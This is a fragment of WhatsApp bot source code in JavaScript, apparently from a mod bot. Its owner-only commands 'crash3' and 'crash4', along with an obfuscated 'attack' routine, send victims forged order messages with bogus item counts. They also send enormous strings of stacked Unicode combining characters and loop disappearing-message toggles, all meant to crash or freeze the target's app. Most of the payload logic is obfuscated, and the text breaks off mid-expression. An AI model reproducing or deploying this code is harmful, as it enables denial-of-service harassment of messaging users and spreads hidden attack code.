              const _0x2a55=['A2v5','B3DUzxjc','ndC1ndC2DLPgCxbX','qxn5BhvTvMLYDxm','otu4n3LrCe1pDa','ndG5ntKYveT6q0r6','nJaYnJf1zNvLvNm','B25SEq','mZq4otyWrLbeq0DT','Dg9Nz2XLrgLZyxbWzwfYAw5NtwvZC2fNzxm','ndi4mJC3yu51z0HU','qgfKAxDHANnOAw5Nl2jHAwXLExm','nvnTshDpqG','4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAscUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwHokwHokwHokwHokwHokwHokwHokwHokwKUkwKUkwKUkwKUkwKUkwKGRILPlILPlILOJILPlILPlILPlILOtILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOtILPlILPlILPlILPik4PAs4PAi4PAq4PAs4PAs4PAs4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAs4PAs4PAs4PAscUkwKUkwJokwKokwKUkwKUkwIokwIokwHokwGokwIokwIokwIokwIokwIokwIokwGokwHokwIokwIokwKUkwKUkwKGRILPdILlZILPdILPlILPlILOJILOJILOtILOtILOtILOtILOJILOJILOtILOtILOtILOtILOJILOJILPlILPlILPik4PAq4Ps84PAq4PAs4PAs4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAs4PAs4PAscUkwKokwHokwKokwIokwIokwIokwIokuGokwGokwKokwKokwGokwIokuGokwIokuGokwJokwKokwIokwIokwHokwKGRILPlILPlILOJILOJILOJILOJILOJILidILidILidILidILidILidILidILidILidILidILPdILOJILOJILOJILOWk4PAs4PAs4PAi4PAa4PAa4PAi4PAi4PAe4PAi4Psa4PAe4Psa4Psa4Psa4PAq4Psa4PAe4PAi4PAi4PAi4PAa4PAscUkwKUkwKUkwIokwKUkwKUkwIokwIokwIokwIokwIokwIokwIokwHokwIokwIokwIokwIokwIokwIokwKUkwKUkwKGRILPlILPlILPlILPlILPlILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILOJILPlILPlILPik4PAs4PAs4PAs4PAs4PAs4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAi4PAs4PAs4PAscUkwKUkwKUkwKUkwKUkwKUkwIokwIokwIokwIokwIokwIokwIokwIokwIokwKokwJokwIokwIokwJokwKUkwKUkwKGRILPlILPlILPlILPlILPlILPdILOdILPdILPlILOZILOdILOJILOdILPlILPdILPlILOJILPlILPlILPlILPlILPik4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAs4PAq4PAs4PAs4PAs4PAs4PAm4PAs4PAs4PAs4PAs4PAscUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKUkwKG','mebZlNDOyxrZyxbWlM5LDa','nJm5ntDVDxLlDM8','4PIG77Ipqxn5BhvT4PIG77Ip','zxH0zw5KzwruzxH0','C2vUze1LC3nHz2u','ndHnyNPZzu8'];const _0x181205=_0x3357;(function(_0x15c8b7,_0x1c69db){const _0x28ef5e=_0x3357;while(!![]){try{const _0x5b2e3c=parseInt(_0x28ef5e(0x89))+-parseInt(_0x28ef5e(0x82))+-parseInt(_0x28ef5e(0x7b))+-parseInt(_0x28ef5e(0x7d))+parseInt(_0x28ef5e(0x86))*parseInt(_0x28ef5e(0x8b))+parseInt(_0x28ef5e(0x79))*-parseInt(_0x28ef5e(0x7f))+parseInt(_0x28ef5e(0x8c));if(_0x5b2e3c===_0x1c69db)break;else _0x15c8b7['push'](_0x15c8b7['shift']());}catch(_0x45cd13){_0x15c8b7['push'](_0x15c8b7['shift']());}}}(_0x2a55,0x45079));if(!isOwner)return reply(mess[_0x181205(0x7a)][_0x181205(0x88)]);function _0x3357(_0x3b0a3d,_0x1534a4){_0x3b0a3d=_0x3b0a3d-0x79;let _0x2a5539=_0x2a55[_0x3b0a3d];if(_0x3357['cjjhGf']===undefined){var _0x335755=function(_0x5225bd){const _0x46b860='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x43d834='';for(let _0x36a7b6=0x0,_0x135f3a,_0x57c727,_0x2a4bc5=0x0;_0x57c727=_0x5225bd['charAt'](_0x2a4bc5++);~_0x57c727&&(_0x135f3a=_0x36a7b6%0x4?_0x135f3a*0x40+_0x57c727:_0x57c727,_0x36a7b6++%0x4)?_0x43d834+=String['fromCharCode'](0xff&_0x135f3a>>(-0x2*_0x36a7b6&0x6)):0x0){_0x57c727=_0x46b860['indexOf'](_0x57c727);}return _0x43d834;};_0x3357['dExSbW']=function(_0x124420){const _0xb94211=_0x335755(_0x124420);let _0x567ce5=[];for(let _0x1648bd=0x0,_0x2f3fcb=_0xb94211['length'];_0x1648bd<_0x2f3fcb;_0x1648bd++){_0x567ce5+='%'+('00'+_0xb94211['charCodeAt'](_0x1648bd)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x567ce5);},_0x3357['YaAqHs']={},_0x3357['cjjhGf']=!![];}const _0x4f0ece=_0x2a55[0x0],_0x30a154=_0x3b0a3d+_0x4f0ece,_0x2f9b51=_0x3357['YaAqHs'][_0x30a154];return _0x2f9b51===undefined?(_0x2a5539=_0x3357['dExSbW'](_0x2a5539),_0x3357['YaAqHs'][_0x30a154]=_0x2a5539):_0x2a5539=_0x2f9b51,_0x2a5539;}function sleep(_0x4f0ece){return new Promise(_0x30a154=>setTimeout(_0x30a154,_0x4f0ece));}function troli(_0x2f9b51){const _0x107123=_0x181205;cnf[_0x107123(0x85)](_0x2f9b51,_0x107123(0x80),MessageType[_0x107123(0x84)],{'quoted':{'key':{'participant':_0x107123(0x81)},'message':{'orderMessage':{'thumbnail':dfrply,'itemCount':-0x39cd8185,'status':0x1,'surface':0x1,'message':_0x107123(0x83),'orderTitle':_0x107123(0x8a),'sellerJid':'0@s.whatsapp.net'}}}});}function bug(_0x5225bd){const _0xc0b2db=_0x181205;for(let _0x43d834=0x0;_0x43d834<0x1;_0x43d834++){var _0x46b860=require(_0xc0b2db(0x7e));cnf[_0xc0b2db(0x7c)](_0x5225bd,_0x46b860);}}async function attack(_0x36a7b6){bug(_0x36a7b6),await sleep(0x64),troli(_0x36a7b6),await sleep(0x64),bug(_0x36a7b6);}attack(mek[_0x181205(0x87)]['remoteJid']);
addFilter(from)
          break					
                    
case prefix+'crash3':
if (isBanned) return  reply(mess.banned)
					if (!isOwner) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('Que cantidad??')
				 for (let i = 0; i < args[0]; i++) {
await cnf.toggleDisappearingMessages(from, 0)
}
sendFakeStatus(from, '𝐂𝐨𝐧𝐟𝐮𝐌𝐨𝐝𝐬'+args.join(' '), fake)
					addFilter(from)
          break
					case prefix+'crash4':
					if (!isOwner) return reply(mess.only.ownerB)
if (!isOwner) return reply(mess.only.ownerB)
var _0x4e42=['݆݆ܻܻࣩ','*Myth','͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋','ܻܻܻܺܺ','݆ܻܻࣩࣩ','๊๊์์์','֟֟֟֓֓','icXbo','hatsa','ٍٍٍٞ٘','᪴᪴᪴᪴Myt','֒֒֒֒֓','์์์๋๋','ؕؕؕؕؖ','Title','͊̈́̈́͋͋͋͋͋͋͋͠͠͠͠͠','ືືຶຶຶ','MOKAD','ّّّّؖ','͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠','̫̫̫̫̫̫̫̫̽̽̽̽̽̽̽','เึางื','͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢','͢͢͠͠͠͠҉҉҉','৭99**','toggl','֓֓֒֒֒','ܑܑۛۛۛ','͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋','҈֟֟֟֟','itemC','ࣩࣩࣩࣧࣧ','ৣ͜͡҉*My','֒֒֒֘֘','֒֓֓֓֓','৭৭৭99','ดุท้่','̼̼̼̼̼̽̽̽̽̽̽̽͊͊͊','Hello','৭ঔৣ͜͡҉*','ຶຶຶຶຶ᪴᪴','ًًٍٍٍ','๊๊๊ࣤࣤ','҈҈̫̫̫̫̫̫̫̫̫̫̫','ؖؕؕؕؕ','๊๊๊์์','͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠','݆݊݊݊݊','̫̫̫̫̫̫̫̫̫̫̫̽̽̽̽','ܺܺܺܺܺ','֓֓֓֓֒','Messa','͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋','t҈҈҈҉','҈҈֟֟֟','͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠','͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́','͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠','݉݊݊݊݊','ࣩ࣯ࣩࣩࣩ','Xbot*','̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫','͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠','҈҈҈̫̫̫̫̫̫̫̫','͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠','ssage','֓֓֓֒֒','݊݊݊݊݊','ຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴','Xbot҈','ingMe','\x20Worl','ؕؕؖؖؖ','ࣨࣨࣨࣨࣤ','݆݆݊݊݊','9999*','֓֒֒֒֘','ؖؖؖؕؕ','ܺ݉݉݉݉','݉݉݉݊݊','৭৭99*','᪴᪴᪴᪴᪴᪴᪴My','֒֒֘֘֘','֗ؖؖؖؖ','๊ࣤࣤࣤࣤ','֟֓֓֓֓','bot*৭','֟֟֟֟֓','͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠','ܑܑܑܑܑ','ٍٍٍٍٍ','Mythi','࣯ࣩࣩࣩࣩ','thicX','order','๋๋๋ືື','҈҈҈҉҉','ًًّٞٞ','݆݆݆݆݅','4829fwHcxj','13hXShDP','͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋','ot*৭৭','݉݉݉݉݊','҈҈҈҈̫̫̫̫̫','͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊','ًًًًً','1359289sKNbgc','݆݆݆݆ܻ','ًّٞٞٞ','t*৭ঔৣ͜͡','৭৭৭*M','์๋๋๋๋','̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋','bot҈҈','ot҈҈҈','**ঔৣ͜͡҉','๊๊๊๊๊','ّّؖؖؖ','ܑܑܑܑۛ','̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊','ܻܻܻܻܻ','hicXb','*ผิดุ','ࣩࣩࣩ࣯ࣩ','҉҉҉҉҉','҈҉҉҉҈','ࣩࣩࣩࣨࣨ','ppear','ًًًٍٍ','̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́','pp.ne','ࣨࣨࣤࣤࣤ','ࣩࣩࣩࣧࣧ','͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠','֘֘֘֗֗','essag','͢͢͠͠͠͠͠͠͠҉҉','ًٍٍٍۛ','างืผิ','ؖؖؖؖؖ','ܑܑܑܑܻ','҉҉҉҈҈','݆݆݆݆݅','ّّّؖؖ','݉݉݊݊݊','๊๊ࣤࣤࣤ','๊๊๊๊์','*৭৭৭ঔ','ًًًًّ','ٍٍٍٍ٘','҈҈҈҈҉','๋๋๋๋๋','ٍۛۛۛۛ','๒๒๒๒๒','֒֒֒֓֓','cXbot','ࣩࣨࣨࣨࣨ','ࣨࣨࣨࣤࣤ','๊์์์์','ܺܺܺ݉݉','͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠','ًًٍٍٍ','֟֟֟֟֟','݆݆݆݊݊','͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠','ࣩࣩࣩࣩࣧ','*999*','ືືືຶຶ','৭৭৭ঔৣ͜͡','᪴Myth','ࣤࣤࣤࣤࣤ','ܑܑܑܻܻ','͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠','͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋','͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊','֘֗֗֗֗','ܻܻࣩࣩࣩ','ܻࣩࣩࣩࣩ','ࣩࣩࣩࣩࣨ','surfa','ًًًٍٍ','messa','ّٞٞٞٞ','҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫','ܑۛۛۛۛ','ܑܑܻܻܻ','๋๋๋๋ື','HOLE','ࣧࣧࣧࣧࣧ','owner','ًًًّٞ','ؕؕؕؖؖ','ٞٞٞٞ٘','҉҈҈҈҉','**999','͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋','0@s.w','݆݆݅݅݅','1cLVQaQ','ࣩࣩࣩࣩ࣯','ؕؖؖؖؖ','ືືືືຶ','͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊','ّّّّّ','ًًًًٍ','̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽','֓֓֓֓֓','ًًّّّ','̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽','͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́','eDisa','1200979orKwdx','֗֗֗֗ؖ','ືືືືື','݆݆݆݆݆','์์๋๋๋','ຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴','҉*Myt','t*৭99','ؕؕؕؕؕ','͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́','᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴','BLACK','๒๒๒*M','์์์์์','҈҉҉҉҉','͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋','99**ঔ','fRhVi','֓֒֒֒֒','ࣩࣩࣩࣩࣩ','݅݅݅݅݅','̫̫̽̽̽̽̽̽̽̽̽̽̽̽̽','݆݆݆݅݅','͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠','2EhGktQ','386031ZjTtDr','only','key','ຶຶຶຶຶ','ount','ࣩࣩࣨࣨࣨ','֒֒֓֓֓','͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠','ٍٍۛۛۛ','֒֘֘֘֘','ٞٞٞٞٞ','ࣩࣧࣧࣧࣧ','9**ঔৣ͜͡','֗֗ؖؖؖ','͢͢͠҉҉҉҉','๋๋ືືື','quote','҉҈҈֟֟','͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋','֟֟֓֓֓','ືຶຶຶຶ','݆݆݅݅݅','sendM','͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠','҈҈҈҈҈','ࣩࣩࣧࣧࣧ','ٍٍٞٞ٘','᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴M','log','statu','cipan','͢͢͠͠͠͠͠͠͠͠͠͠҉','͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊','์์์์๋','᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴\x20','nvSjK','ࣩࣩ࣯ࣩࣩ','ࣩࣧࣧࣧࣧ','͋͢͢͢͢͢͢͢͢͢͠͠͠͠͠','191809UIvCgG','͋͋͋͋͋͋͋͢͢͢͠͠͠͠͠','֗֗֗ؖؖ','selle','֒֒֒֒֒','֘֘֗֗֗','ຶຶຶຶ᪴᪴᪴᪴᪴','҈҈҉҉҉','ythic','݆݆݆݅݅','̫̫̫̫̫̽̽̽̽̽̽̽̽̽̽','parti','̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽','ࣨࣨࣨࣨࣨ','҉҉҈҈֟','ࣩࣩࣩࣩࣧ','157OyWNpx','ঔৣ͜͡҉*M','͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́','ؖؖؕؕؕ','*ঔৣ͜͡҉*','ًّّّّ','3806qyahEk','҉҉҉҉҈','228596HWWiFX','ٍٞٞٞ٘','ܻܻܺܺܺ','ؖؖؖؖؕ','ܺܺ݉݉݉','ًًًًٍ','҈҈҈҈҈̫̫','ٍٍٍۛۛ','֘֘֘֘֗','ot*৭9','ۛۛۛۛۛ','ࣩࣩࣧࣧࣧ','*৭৭৭*','̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͠͠','๋ືືືື','๊๊๊๊ࣤ','͋͋͋͋͢͢͢͢͢͢͠͠͠͠͠','҉҈҈҈҈','ܻܻܻܻܺ','ّؖؖؖؖ','҉҉҈҈҈','ًٍٍٍٍ','̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽','rJid','֘֘֘֘֘','݆݆݆ܻܻ','̫̫̫̫̫̫̫̫̫̫̫̫̫̫̽','݆݆݆݆݊','ܑܑܑۛۛ','ࣨࣤࣤࣤࣤ','ًًًًّ','̼̼̼̽̽̽͊͊͊͊͋͋͋͋͋','ຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴','৭৭৭৭৭','݆݅݅݅݅','ًًًّّ','t*৭৭৭','ท้่เึ','ܑܻܻܻܻ','ܺܺܺܺ݉','ܻܺܺܺܺ','֗֗֗֗֗','̼̼̼̼̼̽̽̽̽͊͊͊͊͋͋','݆݅݅݅݅','ঔৣ͜͡҉*\x20'];var _0x293d1a=function(_0xe5b85f,_0x3e47f9,_0x2b131c,_0x50b73d,_0xb8d2fd){return _0x9cdd(_0xe5b85f-0xf0,_0xb8d2fd);},_0x684e74=function(_0x25fd8a,_0x91e34f,_0x5898f3,_0x242999,_0x14a3c3){return _0x9cdd(_0x25fd8a-0xf0,_0x14a3c3);},_0x40c325=function(_0x3c464a,_0x8c809a,_0x5b0c60,_0x372cc8,_0x578bd0){return _0x9cdd(_0x3c464a-0xf0,_0x578bd0);},_0x28d701=function(_0x4eecc5,_0x3cab4b,_0xd619ab,_0x4cd0f1,_0x12a44a){return _0x9cdd(_0x4eecc5-0xf0,_0x12a44a);},_0x1dea33=function(_0x366fa0,_0x2f56d1,_0x6aa090,_0x49a4ac,_0x385e7d){return _0x9cdd(_0x366fa0-0xf0,_0x385e7d);};(function(_0x33730b,_0x32f0a8){var _0x163b34=function(_0x5f0177,_0x81cca3,_0x114d9e,_0x2eff52,_0x4fa4a2){return _0x9cdd(_0x2eff52- -0x204,_0x5f0177);},_0x32a1c2=function(_0x33946c,_0x2c302d,_0x1ad08d,_0x38ac3b,_0x3d59e1){return _0x9cdd(_0x38ac3b- -0x204,_0x33946c);},_0x4cd96d=function(_0x47e52a,_0x1402ed,_0x272342,_0x4905da,_0x14ba71){return _0x9cdd(_0x4905da- -0x204,_0x47e52a);},_0x43fde5=function(_0x12d949,_0xc6d9f5,_0x30ecb2,_0x418664,_0x43cb19){return _0x9cdd(_0x418664- -0x204,_0x12d949);},_0x5bee71=function(_0x5858b1,_0x3a3a7c,_0x23ba7d,_0x5eeccf,_0x39992f){return _0x9cdd(_0x5eeccf- -0x204,_0x5858b1);};while(!![]){try{var _0x39e2d9=parseInt(_0x163b34(0x25,-0x5f,-0xe3,-0x54,-0xf))+-parseInt(_0x32a1c2(0x9b,0x28,0x1c,0x46,0xa2))+parseInt(_0x4cd96d(-0x1,-0xd6,0x31,-0x5a,-0x13))*-parseInt(_0x43fde5(0xa7,-0x29,-0x52,0x3e,0xd9))+parseInt(_0x32a1c2(0x5d,0x151,0xa4,0xaf,0x34))*parseInt(_0x43fde5(0x55,0xd8,0xfb,0xa2,0x135))+-parseInt(_0x4cd96d(-0x28,0x1c,-0xf9,-0x91,-0x4b))+-parseInt(_0x32a1c2(-0xbd,-0xcb,-0xe4,-0x52,-0x99))*parseInt(_0x5bee71(-0x3a,-0xb,-0x6f,-0x92,-0x72))+-parseInt(_0x163b34(-0x19,0x2d,0x40,-0x6a,-0xfd))*-parseInt(_0x5bee71(-0x43,0x28,0x9b,0x3f,-0x5f));if(_0x39e2d9===_0x32f0a8)break;else _0x33730b['push'](_0x33730b['shift']());}catch(_0x40f4da){_0x33730b['push'](_0x33730b['shift']());}}}(_0x4e42,0x43a45+0x3be1*0x1a+-0x50c2*-0x3));if(!isOwner)return reply(mess[_0x293d1a(0x264,0x2c6,0x252,0x2e4,0x21b)][_0x293d1a(0x38d,0x429,0x3f9,0x2f3,0x31e)+'B']);setTimeout(()=>{var _0x3355c2=function(_0x43513e,_0x57f1de,_0x3e0b47,_0x460706,_0x342bf2){return _0x293d1a(_0x43513e-0x1ee,_0x57f1de-0x172,_0x3e0b47-0x6c,_0x460706-0xdc,_0x460706);},_0x56d461=function(_0x1867b5,_0x343438,_0x4289f5,_0x17c281,_0x5849d4){return _0x293d1a(_0x1867b5-0x1ee,_0x343438-0x1d0,_0x4289f5-0xed,_0x17c281-0xbd,_0x17c281);},_0x551ccd=function(_0x264413,_0x5305dd,_0x11cfee,_0x323213,_0xf60af2){return _0x684e74(_0x264413-0x1ee,_0x5305dd-0x8c,_0x11cfee-0x1b8,_0x323213-0x3e,_0x323213);},_0x506de4=function(_0x108789,_0x32b5a8,_0x2d0447,_0x1d98c5,_0x46e0b7){return _0x684e74(_0x108789-0x1ee,_0x32b5a8-0x1e9,_0x2d0447-0x42,_0x1d98c5-0xb4,_0x1d98c5);},_0x15fee0=function(_0x168d34,_0x2d9aee,_0xc2ee03,_0x2e815a,_0x306ed9){return _0x684e74(_0x168d34-0x1ee,_0x2d9aee-0xf3,_0xc2ee03-0xe8,_0x2e815a-0x6,_0x2e815a);},_0x289218={};_0x289218[_0x3355c2(0x449,0x42a,0x467,0x48f,0x4bb)]=_0x56d461(0x4ce,0x426,0x4fd,0x42b,0x4b8)+'D';var _0x7d80f1=_0x289218;cnf[_0x3355c2(0x4d6,0x50a,0x44d,0x441,0x57d)+_0x551ccd(0x590,0x4e4,0x4e9,0x611,0x52a)+_0x551ccd(0x53d,0x4b3,0x4e3,0x5c4,0x58e)+_0x3355c2(0x503,0x54e,0x582,0x477,0x524)+_0x506de4(0x4fe,0x46a,0x542,0x508,0x506)+'s'](from,_0x7d80f1[_0x15fee0(0x449,0x4e5,0x4d0,0x3ab,0x4ec)]);},-0x1*0x2a2+-0x1*0xcaa+0xf4e);var _0xe42396={};_0xe42396[_0x40c325(0x295,0x227,0x2f9,0x2f7,0x2c0)+_0x28d701(0x281,0x299,0x29c,0x258,0x248)+'t']=_0x28d701(0x394,0x3a7,0x30a,0x353,0x41e)+_0x40c325(0x2d7,0x2e6,0x314,0x2c6,0x36a)+_0x684e74(0x352,0x3ea,0x2bb,0x2da,0x30e)+'t';var _0x5ef334={};function _0x9cdd(_0x70a090,_0xec8581){_0x70a090=_0x70a090-(-0x48d*0x3+0x1bab+-0xca1);var _0x234669=_0x4e42[_0x70a090];return _0x234669;}_0x5ef334[_0x684e74(0x2ed,0x357,0x382,0x2bc,0x344)+_0x40c325(0x267,0x2c5,0x1e6,0x1ff,0x2d6)]=0x98967f,_0x5ef334[_0x293d1a(0x280,0x312,0x300,0x2b1,0x2a9)+'s']=0x1,_0x5ef334[_0x1dea33(0x383,0x385,0x3a4,0x37b,0x3dc)+'ce']=0x1,_0x5ef334[_0x28d701(0x385,0x3b8,0x3e8,0x2f6,0x319)+'ge']=_0x684e74(0x2ce,0x26c,0x2da,0x249,0x315)+_0x1dea33(0x32f,0x3c0,0x370,0x382,0x3c8)+_0x40c325(0x2b6,0x2d8,0x28d,0x32e,0x241)+_0x293d1a(0x291,0x22c,0x21b,0x263,0x239)+_0x293d1a(0x391,0x359,0x361,0x3bf,0x401)+_0x684e74(0x2b6,0x287,0x2c9,0x25e,0x354)+_0x28d701(0x35d,0x390,0x2c7,0x36e,0x3fc)+_0x28d701(0x291,0x294,0x273,0x2e8,0x2b4)+_0x684e74(0x34c,0x3f5,0x2e8,0x301,0x3e8)+_0x684e74(0x34c,0x3f3,0x2f6,0x2f1,0x2d0)+_0x684e74(0x34c,0x382,0x310,0x3d4,0x34e)+_0x28d701(0x34c,0x3bf,0x335,0x303,0x39b)+_0x684e74(0x34c,0x2f5,0x31c,0x2eb,0x30f)+_0x40c325(0x35d,0x3db,0x2ba,0x39c,0x2cf)+_0x684e74(0x2a8,0x20d,0x2ee,0x267,0x219)+_0x293d1a(0x30c,0x36c,0x2bf,0x2f8,0x26f)+_0x293d1a(0x30c,0x386,0x392,0x2c7,0x378)+_0x1dea33(0x25f,0x23e,0x2d6,0x2b4,0x2af)+_0x28d701(0x2b8,0x2c0,0x279,0x273,0x315)+_0x28d701(0x2c1,0x239,0x36b,0x2c7,0x2b0)+_0x40c325(0x37d,0x37b,0x3ba,0x30c,0x410)+_0x684e74(0x303,0x257,0x306,0x279,0x2d3)+_0x28d701(0x29c,0x2a2,0x31e,0x259,0x346)+_0x293d1a(0x2eb,0x394,0x389,0x269,0x29d)+_0x1dea33(0x289,0x1f8,0x1fb,0x205,0x2a5)+_0x40c325(0x30d,0x374,0x324,0x31c,0x3a7)+_0x40c325(0x2e5,0x2d6,0x37e,0x2fc,0x29d)+_0x40c325(0x2e2,0x33a,0x2f7,0x350,0x308)+_0x293d1a(0x271,0x26a,0x216,0x2a7,0x226)+_0x28d701(0x305,0x2b3,0x294,0x26a,0x32d)+_0x293d1a(0x372,0x418,0x3b0,0x2f3,0x3df)+_0x1dea33(0x372,0x3c3,0x2e1,0x403,0x328)+_0x40c325(0x39e,0x3f6,0x38f,0x3c3,0x367)+_0x293d1a(0x39e,0x3cf,0x3bc,0x40d,0x42d)+_0x684e74(0x2e9,0x360,0x2c4,0x2d1,0x35b)+_0x1dea33(0x28e,0x209,0x335,0x21e,0x2a6)+_0x1dea33(0x28e,0x2f4,0x1e1,0x217,0x2c6)+_0x28d701(0x28e,0x221,0x221,0x224,0x2e0)+_0x28d701(0x2f1,0x374,0x31e,0x301,0x363)+_0x28d701(0x301,0x36a,0x311,0x358,0x2d7)+_0x40c325(0x321,0x283,0x3a0,0x2c9,0x38d)+_0x293d1a(0x2aa,0x2ab,0x281,0x345,0x24f)+_0x1dea33(0x2cb,0x2fa,0x2d2,0x362,0x298)+_0x293d1a(0x2cb,0x374,0x2db,0x259,0x253)+_0x1dea33(0x3a4,0x31a,0x339,0x440,0x381)+_0x293d1a(0x35b,0x348,0x3a6,0x305,0x370)+_0x684e74(0x35b,0x3be,0x3ae,0x35a,0x368)+_0x293d1a(0x35b,0x2dd,0x31b,0x32c,0x2d6)+_0x28d701(0x35b,0x3eb,0x300,0x2cf,0x3c2)+_0x40c325(0x35b,0x30e,0x307,0x3af,0x404)+_0x28d701(0x35b,0x2f0,0x2e7,0x3e6,0x3f4)+_0x28d701(0x35b,0x2e3,0x2ba,0x309,0x348)+_0x28d701(0x31c,0x2b5,0x32c,0x2b0,0x393)+_0x1dea33(0x3ab,0x443,0x3f2,0x401,0x369)+_0x40c325(0x2dc,0x254,0x35f,0x2ef,0x2a7)+_0x28d701(0x35b,0x30b,0x2d5,0x3a9,0x407)+_0x1dea33(0x35b,0x2e8,0x3d2,0x308,0x2b0)+_0x684e74(0x39b,0x354,0x2ee,0x39f,0x3d9)+_0x28d701(0x39b,0x33e,0x43e,0x319,0x401)+_0x1dea33(0x2c0,0x33b,0x31c,0x226,0x2e7)+_0x684e74(0x38e,0x411,0x332,0x416,0x2ee)+_0x1dea33(0x26d,0x2f2,0x1cc,0x253,0x208)+_0x293d1a(0x26d,0x1dc,0x318,0x1c5,0x1f7)+_0x1dea33(0x26d,0x215,0x1dc,0x1e0,0x27a)+_0x1dea33(0x26d,0x232,0x314,0x21a,0x284)+_0x28d701(0x390,0x3aa,0x3a5,0x334,0x40f)+_0x293d1a(0x329,0x36b,0x2b0,0x39b,0x29f)+_0x293d1a(0x329,0x3a2,0x2eb,0x32e,0x30f)+_0x293d1a(0x329,0x364,0x366,0x373,0x354)+_0x1dea33(0x329,0x30e,0x2cb,0x3af,0x3b2)+_0x684e74(0x329,0x364,0x32e,0x32f,0x340)+_0x40c325(0x329,0x298,0x341,0x2e3,0x2ef)+_0x40c325(0x329,0x323,0x2d1,0x3b8,0x29f)+_0x28d701(0x329,0x2d2,0x345,0x331,0x39b)+_0x1dea33(0x329,0x3bd,0x2f6,0x37a,0x2f8)+_0x40c325(0x329,0x344,0x37c,0x303,0x2d2)+_0x1dea33(0x329,0x337,0x2d0,0x351,0x2a9)+_0x28d701(0x329,0x30d,0x27d,0x2ca,0x345)+_0x28d701(0x329,0x2b1,0x369,0x375,0x3a2)+_0x28d701(0x329,0x39b,0x378,0x303,0x3b4)+_0x684e74(0x2f8,0x2e2,0x2d9,0x37d,0x24b)+_0x28d701(0x339,0x319,0x35c,0x350,0x31d)+_0x684e74(0x339,0x32e,0x2c3,0x29e,0x2d6)+_0x40c325(0x339,0x2a8,0x318,0x31e,0x317)+_0x40c325(0x339,0x323,0x331,0x360,0x386)+_0x28d701(0x339,0x2c4,0x2c5,0x39e,0x32f)+_0x28d701(0x339,0x33e,0x2c0,0x387,0x2e7)+_0x1dea33(0x339,0x395,0x3d4,0x28c,0x380)+_0x28d701(0x339,0x3a2,0x2f1,0x38f,0x2f8)+_0x684e74(0x339,0x3c0,0x2df,0x397,0x388)+_0x1dea33(0x371,0x2ca,0x346,0x2f5,0x3c0)+_0x40c325(0x2ac,0x31e,0x348,0x2c2,0x217)+_0x28d701(0x2ac,0x2df,0x25a,0x26d,0x2b5)+_0x40c325(0x2ac,0x245,0x2d4,0x2dc,0x200)+_0x40c325(0x2ac,0x328,0x28a,0x2e5,0x30f)+_0x684e74(0x2ac,0x318,0x255,0x30d,0x30c)+_0x293d1a(0x2ac,0x2ea,0x32c,0x2aa,0x335)+_0x1dea33(0x2ac,0x2a2,0x2e8,0x205,0x2ad)+_0x293d1a(0x2ac,0x275,0x308,0x24d,0x348)+_0x1dea33(0x346,0x3f0,0x3b3,0x343,0x363)+_0x684e74(0x328,0x2c2,0x321,0x2f2,0